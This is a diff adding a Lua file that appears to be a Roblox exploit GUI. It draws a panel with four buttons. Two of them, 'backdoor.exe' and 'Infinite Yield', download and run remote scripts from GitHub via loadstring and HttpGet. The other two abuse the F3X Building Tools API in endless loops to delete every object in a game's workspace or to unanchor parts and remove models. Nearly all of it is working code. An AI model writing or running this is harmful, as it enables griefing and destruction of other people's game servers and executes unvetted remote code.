@@ -1,0 +1,159 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
+]=]
+
+-- Instances: 11 | Scripts: 4 | Modules: 0
+local G2L = {};
+
+-- StarterGui.firetrips9guiFE
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"]["Name"] = [[firetrips9guiFE]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 3;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(41, 79, 255);
+G2L["2"]["Size"] = UDim2.new(0, 396, 0, 392);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["2"]["Position"] = UDim2.new(0, 0, 0.21003134548664093, 0);
+G2L["2"]["Name"] = [[ayowhatyoulookingat]];
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextLabel
+G2L["3"] = Instance.new("TextLabel", G2L["2"]);
+G2L["3"]["TextWrapped"] = true;
+G2L["3"]["ZIndex"] = 3;
+G2L["3"]["BorderSizePixel"] = 3;
+G2L["3"]["TextScaled"] = true;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3"]["TextSize"] = 14;
+G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["Size"] = UDim2.new(0, 396, 0, 62);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["3"]["Text"] = [[Untitled firetrips9 GUI]];
+G2L["3"]["BackgroundTransparency"] = 1;
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton
+G2L["4"] = Instance.new("TextButton", G2L["2"]);
+G2L["4"]["TextWrapped"] = true;
+G2L["4"]["BorderSizePixel"] = 0;
+G2L["4"]["TextScaled"] = true;
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["4"]["TextSize"] = 14;
+G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Size"] = UDim2.new(0, 120, 0, 41);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["4"]["Text"] = [[backdoor.exe]];
+G2L["4"]["Position"] = UDim2.new(0, 0, 0.15816326439380646, 0);
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+G2L["5"] = Instance.new("LocalScript", G2L["4"]);
+
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton
+G2L["6"] = Instance.new("TextButton", G2L["2"]);
+G2L["6"]["TextWrapped"] = true;
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["6"]["TextSize"] = 13;
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Size"] = UDim2.new(0, 120, 0, 41);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["6"]["Text"] = [[delete all parts (FE BUT NEEDS F3X AND DOES NOT WORK ON TERRAIN)]];
+G2L["6"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.15816326439380646, 0);
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+G2L["7"] = Instance.new("LocalScript", G2L["6"]);
+
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton
+G2L["8"] = Instance.new("TextButton", G2L["2"]);
+G2L["8"]["TextWrapped"] = true;
+G2L["8"]["BorderSizePixel"] = 0;
+G2L["8"]["TextScaled"] = true;
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["8"]["TextSize"] = 13;
+G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["Size"] = UDim2.new(0, 120, 0, 41);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["8"]["Text"] = [[Infinite Yield]];
+G2L["8"]["Position"] = UDim2.new(0.6590909361839294, 0, 0.15816326439380646, 0);
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+G2L["9"] = Instance.new("LocalScript", G2L["8"]);
+
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton
+G2L["a"] = Instance.new("TextButton", G2L["2"]);
+G2L["a"]["TextWrapped"] = true;
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["TextScaled"] = true;
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["a"]["TextSize"] = 13;
+G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Size"] = UDim2.new(0, 120, 0, 41);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["a"]["Text"] = [[unanchor all (again, needs F3X)]];
+G2L["a"]["Position"] = UDim2.new(0, 0, 0.30612245202064514, 0);
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
+
+
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+local function C_5()
+local script = G2L["5"];
+	script.Parent.Activated:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+	end)
+end;
+task.spawn(C_5);
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+local function C_7()
+local script = G2L["7"];
+	script.Parent.Activated:Connect(function()
+		while wait() do
+			for _, obj in ipairs(workspace:GetChildren()) do
+				game.Players.LocalPlayer.Backpack:WaitForChild('Building Tools').SyncAPI:Invoke('Remove', {obj})
+			end
+		end
+	end)
+end;
+task.spawn(C_7);
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+local function C_9()
+local script = G2L["9"];
+	script.Parent.Activated:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+end;
+task.spawn(C_9);
+-- StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+local function C_b()
+local script = G2L["b"];
+	script.Parent.Activated:Connect(function()
+		while wait() do
+			for _, obj in ipairs(workspace:GetChildren()) do
+				if obj:IsA('BasePart') then
+					game.Players.LocalPlayer.Backpack:WaitForChild('Building Tools').SyncAPI:Invoke('SyncAnchor', {obj})
+				else if obj:IsA('Model') then
+						game.Players.LocalPlayer.Backpack:WaitForChild('Building Tools').SyncAPI:Invoke('Remove', {obj})
+					end
+				end
+			end
+		end
+	end)
+end;
+task.spawn(C_b);
+
+return G2L["1"], require;
